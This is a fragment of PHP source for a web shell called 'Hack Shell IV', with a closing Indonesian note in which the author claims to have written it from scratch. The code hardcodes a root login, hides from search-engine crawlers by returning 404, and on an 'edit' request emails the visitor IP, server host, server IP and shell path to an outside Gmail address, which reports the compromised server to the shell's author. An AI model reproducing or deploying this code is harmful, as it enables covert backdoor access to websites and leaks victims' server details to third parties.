...
<font color="white"><body bgcolor="black">'; $username="root"; $password="131"; @error_reporting(4); if(!empty($_SERVER['HTTP_USER_AGENT'])) { $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"); if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); exit; } } echo ""; if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) { if($_POST["usrname"]==$username && $_POST["passwrd"]==$password) { print'<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script><meta http-equiv="refresh" content="0">'; } else { if($_POST['usrname']) { print'<script>alert("Wrong Password!!");</script>'; } echo '<center><br><br><h1><font face="couriernew"><font color="#8B0101"><< </font>Back<font color=#8B0101>|</font>Hack Shell <font color="#8B0101">IV</font></h1>
<form method="post">
...
<?php if(isset($_GET['edit'])){ $ip1=$_SERVER['REMOTE_ADDR']; $ip2=$_SERVER['SERVER_ADDR']; $zzz=$_SERVER['HTTP_HOST']; $xxx=$_SERVER['SCRIPT_FILENAME']; $From="backhack"; $Subject="backhack"; $Message="Pengguna : $ip1<br> Server : $zzz // $ip2<br> Shell => $xxx"; $Emails="soracyberteam@gmail.com"; $Name="backhack"; $headers = "MIME-Version: 1.0\r\n"; $headers .= "Content-type:text/html;charset=UTF-8\r\n"; $headers .= "From: <".$From.">\r\n"; $headers .= "Cc: ".$Name."\r\n"; $Emails = explode("\r\n", "soracyberteam@gmail.com"); foreach($Emails as $email) { mail($email,$Subject,$Message,$headers); } } ?>
...
Beberapa tools di shell ini memang masih
mengambil tools milik orang lain, tapi
shell ini benar benar dibuat dari awal.
Dari server info, exe command, benar"
dari awal dan tidak merecode shell yang
